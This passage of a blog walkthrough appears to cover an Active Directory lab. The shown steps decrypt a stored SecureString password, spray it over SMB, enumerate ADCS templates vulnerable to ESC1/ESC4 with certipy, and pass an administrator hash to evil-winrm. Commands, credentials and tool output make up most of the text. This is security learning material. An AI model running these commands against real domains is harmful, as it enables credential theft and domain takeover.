</span></span><span class="line"><span class="cl">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
</span></span></code></pre></div><ul>
<li>To decrypt this we can replicate the following steps</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; <span class="nv">$user</span> <span class="o">=</span> <span class="s2">&#34;Enrollment Automation Account&#34;</span> <span class="c1"># Not necessary a valid user if you don&#39;t have one</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&#34;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b&#34;</span> <span class="p">|</span> ConvertTo-SecureString
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; <span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="nv">$user</span>, <span class="nv">$pass</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; <span class="nv">$cred</span>.GetNetworkCredential<span class="o">()</span> <span class="p">|</span> fl
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">UserName       : Enrollment Automation Account
</span></span><span class="line"><span class="cl">Password       : hHO_S9gff7ehXw
</span></span><span class="line"><span class="cl">SecurePassword : System.Security.SecureString
</span></span><span class="line"><span class="cl">Domain         :
</span></span></code></pre></div><ul>
<li>Now that we have the clear text password but don&rsquo;t know which account uses this password, we can go ahead and password spray and as shown below we got a hit on user <code>Jodie.Summers</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cme smb 192.168.220.30 -u users.txt -p hHO_S9gff7ehXw
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">20348</span> x64 <span class="o">(</span>name:NARA<span class="o">)</span> <span class="o">(</span>domain:nara-security.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>dministrator:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\G</span>uest:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\k</span>rbtgt:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\N</span>ARA$:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>melia.O<span class="s1">&#39;Brien:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.220.30  445    NARA             [-] nara-security.com\Damian.Johnson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.220.30  445    NARA             [-] nara-security.com\Helen.Robinson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.220.30  445    NARA             [-] nara-security.com\Sara.O&#39;</span>Sullivan:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>asmine.Roberts:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\D</span>eclan.Reynolds:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.220.30  <span class="m">445</span>    NARA             <span class="o">[</span>+<span class="o">]</span> nara-security.com<span class="se">\J</span>odie.Summers:hHO_S9gff7ehXw 
</span></span></code></pre></div><ul>
<li>I don&rsquo;t know what made me think about ADCS attacks but the <strong>&ldquo;Enrollment Automation Account&rdquo;</strong> already gave it away i think. so i decided to enumerate vulnerable certificates using the <code>certipy</code> tool.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy find -vulnerable -dc-ip 192.168.220.30 -u <span class="s1">&#39;Jodie.Summers@nara-security.com&#39;</span> -p <span class="s1">&#39;hHO_S9gff7ehXw&#39;</span>
</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">34</span> certificate templates
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">12</span> enabled certificate templates
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;NARA-CA&#39;</span> via CSRA
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;NARA-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;NARA-CA&#39;</span> via RRP
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;NARA-CA&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved BloodHound data to <span class="s1">&#39;20240816092801_Certipy.zip&#39;</span>. Drag and drop the file into the BloodHound GUI from @ly4k
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved text output to <span class="s1">&#39;20240816092801_Certipy.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved JSON output to <span class="s1">&#39;20240816092801_Certipy.json&#39;</span>
</span></span></code></pre></div><ul>
<li>Also this user belongs to the <code>CERTIFICATE SERVICE DCOM ACCESS</code> group while mapping things out with bloodhound.</li>
</ul>
<p><img loading="lazy" src="https://i.imgur.com/IAwcFIN.png" alt=""  />
</p>
<ul>
<li>As shown below this is vulnerable to <code>ESC1</code> exploit, using few blogs i was able to navigate this ; <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse">Blog1</a>, <a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/"><code>Blog2</code></a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">❯</span> <span class="err">\cat</span> <span class="mi">20240816092801</span><span class="err">_Certipy.txt</span>
</span></span><span class="line"><span class="cl"><span class="err">Certificate</span> <span class="err">Authorities</span>
</span></span><span class="line"><span class="cl">  <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="err">CA</span> <span class="err">Name</span>                             <span class="err">:</span> <span class="err">NARA-CA</span>
</span></span><span class="line"><span class="cl">    <span class="err">DNS</span> <span class="err">Name</span>                            <span class="err">:</span> <span class="err">Nara.nara-security.com</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Subject</span>                 <span class="err">:</span> <span class="err">CN=NARA-CA,</span> <span class="err">DC=nara-security,</span> <span class="err">DC=com</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Serial</span> <span class="err">Number</span>           <span class="err">:</span> <span class="mf">2401E520</span><span class="err">F</span><span class="mi">70</span><span class="err">B</span><span class="mi">7</span><span class="err">DA</span><span class="mi">34</span><span class="err">C</span><span class="mi">32</span><span class="err">FABC</span><span class="mi">71</span><span class="err">D</span><span class="mf">89E1</span><span class="err">D</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Validity</span> <span class="err">Start</span>          <span class="err">:</span> <span class="mi">2023-07-30</span> <span class="mi">14</span><span class="err">:</span><span class="mi">06</span><span class="err">:</span><span class="mi">05</span><span class="err">+</span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Validity</span> <span class="err">End</span>            <span class="err">:</span> <span class="mi">2123-07-30</span> <span class="mi">14</span><span class="err">:</span><span class="mi">16</span><span class="err">:</span><span class="mi">04</span><span class="err">+</span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl">    <span class="err">Web</span> <span class="err">Enrollment</span>                      <span class="err">:</span> <span class="err">Disabled</span>
</span></span><span class="line"><span class="cl">    <span class="err">User</span> <span class="err">Specified</span> <span class="err">SAN</span>                  <span class="err">:</span> <span class="err">Disabled</span>
</span></span><span class="line"><span class="cl">    <span class="err">Request</span> <span class="err">Disposition</span>                 <span class="err">:</span> <span class="err">Issue</span>
</span></span><span class="line"><span class="cl">    <span class="err">Enforce</span> <span class="err">Encryption</span> <span class="err">for</span> <span class="err">Requests</span>     <span class="err">:</span> <span class="err">Enabled</span>
</span></span><span class="line"><span class="cl">    <span class="err">Permissions</span>
</span></span><span class="line"><span class="cl">      <span class="err">Owner</span>                             <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Administrators</span>
</span></span><span class="line"><span class="cl">      <span class="err">Access</span> <span class="err">Rights</span>
</span></span><span class="line"><span class="cl">        <span class="err">ManageCertificates</span>              <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Administrators</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">        <span class="err">ManageCa</span>                        <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Administrators</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">        <span class="err">Enroll</span>                          <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Authenticated</span> <span class="err">Users</span>
</span></span><span class="line"><span class="cl"><span class="err">Certificate</span> <span class="err">Templates</span>
</span></span><span class="line"><span class="cl">  <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="err">Template</span> <span class="err">Name</span>                       <span class="err">:</span> <span class="err">NaraUser</span>
</span></span><span class="line"><span class="cl">    <span class="err">Display</span> <span class="err">Name</span>                        <span class="err">:</span> <span class="err">NaraUser</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Authorities</span>             <span class="err">:</span> <span class="err">NARA-CA</span>
</span></span><span class="line"><span class="cl">    <span class="err">Enabled</span>                             <span class="err">:</span> <span class="err">True</span>
</span></span><span class="line"><span class="cl">    <span class="err">Client</span> <span class="err">Authentication</span>               <span class="err">:</span> <span class="err">True</span>
</span></span><span class="line"><span class="cl">    <span class="err">Enrollment</span> <span class="err">Agent</span>                    <span class="err">:</span> <span class="err">False</span>
</span></span><span class="line"><span class="cl">    <span class="err">Any</span> <span class="err">Purpose</span>                         <span class="err">:</span> <span class="err">False</span>
</span></span><span class="line"><span class="cl">    <span class="err">Enrollee</span> <span class="err">Supplies</span> <span class="err">Subject</span>           <span class="err">:</span> <span class="err">True</span>
</span></span><span class="line"><span class="cl">    <span class="err">Certificate</span> <span class="err">Name</span> <span class="err">Flag</span>               <span class="err">:</span> <span class="err">EnrolleeSuppliesSubject</span>
</span></span><span class="line"><span class="cl">    <span class="err">Enrollment</span> <span class="err">Flag</span>                     <span class="err">:</span> <span class="err">UserInteractionRequired</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">PublishToDs</span>
</span></span><span class="line"><span class="cl">    <span class="err">Private</span> <span class="err">Key</span> <span class="err">Flag</span>                    <span class="err">:</span> <span class="err">ExportableKey</span>
</span></span><span class="line"><span class="cl">    <span class="err">Extended</span> <span class="err">Key</span> <span class="err">Usage</span>                  <span class="err">:</span> <span class="err">Encrypting</span> <span class="err">File</span> <span class="err">System</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">Secure</span> <span class="err">Email</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">Client</span> <span class="err">Authentication</span>
</span></span><span class="line"><span class="cl">    <span class="err">Requires</span> <span class="err">Manager</span> <span class="err">Approval</span>           <span class="err">:</span> <span class="err">False</span>
</span></span><span class="line"><span class="cl">    <span class="err">Requires</span> <span class="err">Key</span> <span class="err">Archival</span>               <span class="err">:</span> <span class="err">False</span>
</span></span><span class="line"><span class="cl">    <span class="err">Authorized</span> <span class="err">Signatures</span> <span class="err">Required</span>      <span class="err">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="err">Validity</span> <span class="err">Period</span>                     <span class="err">:</span> <span class="mi">100</span> <span class="err">years</span>
</span></span><span class="line"><span class="cl">    <span class="err">Renewal</span> <span class="err">Period</span>                      <span class="err">:</span> <span class="mi">6</span> <span class="err">weeks</span>
</span></span><span class="line"><span class="cl">    <span class="err">Minimum</span> <span class="err">RSA</span> <span class="err">Key</span> <span class="err">Length</span>              <span class="err">:</span> <span class="mi">2048</span>
</span></span><span class="line"><span class="cl">    <span class="err">Permissions</span>
</span></span><span class="line"><span class="cl">      <span class="err">Enrollment</span> <span class="err">Permissions</span>
</span></span><span class="line"><span class="cl">        <span class="err">Enrollment</span> <span class="err">Rights</span>               <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Users</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">      <span class="err">Object</span> <span class="err">Control</span> <span class="err">Permissions</span>
</span></span><span class="line"><span class="cl">        <span class="err">Owner</span>                           <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Administrator</span>
</span></span><span class="line"><span class="cl">        <span class="err">Full</span> <span class="err">Control</span> <span class="err">Principals</span>         <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Enrollment</span>
</span></span><span class="line"><span class="cl">        <span class="err">Write</span> <span class="err">Owner</span> <span class="err">Principals</span>          <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Administrator</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enrollment</span>
</span></span><span class="line"><span class="cl">        <span class="err">Write</span> <span class="err">Dacl</span> <span class="err">Principals</span>           <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Administrator</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enrollment</span>
</span></span><span class="line"><span class="cl">        <span class="err">Write</span> <span class="err">Property</span> <span class="err">Principals</span>       <span class="err">:</span> <span class="err">NARA-SECURITY.COM\Domain</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enterprise</span> <span class="err">Admins</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Administrator</span>
</span></span><span class="line"><span class="cl">                                          <span class="err">NARA-SECURITY.COM\Enrollment</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="err">Vulnerabilities</span>
</span></span><span class="line"><span class="cl">      <span class="err">ESC</span><span class="mi">1</span>                              <span class="err">:</span> <span class="err">&#39;NARA-SECURITY.COM\\Domain</span> <span class="err">Users&#39;</span> <span class="err">and</span> <span class="err">&#39;NARA-SECURITY.COM\\Enrollment&#39;</span> <span class="err">can</span> <span class="err">enroll,</span> <span class="err">enrollee</span> <span class="err">supplies</span> <span class="err">subject</span> <span class="err">and</span> <span class="err">template</span> <span class="err">allows</span> <span class="err">client</span> <span class="err">authentication</span>
</span></span><span class="line"><span class="cl">      <span class="err">ESC</span><span class="mi">4</span>                              <span class="err">:</span> <span class="err">&#39;NARA-SECURITY.COM\\Enrollment&#39;</span> <span class="err">has</span> <span class="err">dangerous</span> <span class="err">permissions</span>
</span></span></code></pre></div><ul>
<li>However trying to request a certificate file <code>.pfx</code> i keep getting this error, although the goal is to keep trying till it works, but after numerous attempt this didn&rsquo;t work for me. I mean i just made this blog so you can understand how this works.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy req -username JODIE.SUMMERS -password hHO_S9gff7ehXw -target nara-security.com -ca NARA-CA -template NaraUser -upn administrator@nara-security.com -dc-ip 192.168.220.30 -debug
</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to resolve <span class="s1">&#39;nara-security.com&#39;</span> at <span class="s1">&#39;192.168.220.30&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generating RSA key
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to endpoint: ncacn_np:192.168.220.30<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connected to endpoint: ncacn_np:192.168.220.30<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Got error <span class="k">while</span> trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation <span class="k">function</span> was unable to check revocation because the revocation server was offline.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">25</span>
</span></span><span class="line"><span class="cl">Would you like to save the private key? <span class="o">(</span>y/N<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Failed to request certificate
</span></span></code></pre></div><ul>
<li>If you want you can check this video of a friend exploiting the certificate template on a live stream by <a href="https://www.youtube.com/watch?v=sQgsRfmMus8">Ye Zeiya Shein</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.220.30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Gives administrator hash</span>
</span></span></code></pre></div><ul>
<li>You can then pass-the-hash using the <code>evil-winrm</code> utility in kali as the user administrator</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 192.168.220.30 -u administrator -H d35c4ae45bdd10a4e28ff529a2155745
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">--SNIP--
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:37131/tags/active-directory/">Active Directory</a></li>
      <li><a href="http://localhost:37131/tags/windows/">Windows</a></li>
      <li><a href="http://localhost:37131/tags/phishing/">Phishing</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:37131/hacking/cfss/">
    <span class="title">« Prev</span>
    <br>
    <span>CFSS</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://localhost:37131/">SecFortess</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
